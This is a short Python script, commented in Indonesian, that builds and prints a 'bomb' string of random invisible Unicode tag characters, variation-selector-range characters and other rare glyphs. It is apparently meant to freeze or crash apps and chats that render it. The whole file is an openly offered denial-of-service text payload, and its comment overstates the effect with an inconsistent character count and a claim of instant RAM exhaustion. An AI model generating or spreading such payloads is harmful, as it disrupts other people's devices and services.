import random
bom = ""
for i in range(1000):  # 50.000 karakter = langsung RAM full
    bom += chr(0xE0000 + random.randint(0, 0xFFFF)) + chr(0xFE00 + random.randint(0, 0xFF))
    bom += "󠀁󠀂󠀃󠀄󠀅󠀆󠀇󠀈󠀉󠀊󠀋󠀌󠀍󠀎󠀏"
    bom += "𐀀𐀁𐀂𐀃𐀄𐀅𐀆𐀇𐀈𐀉"
print(bom)
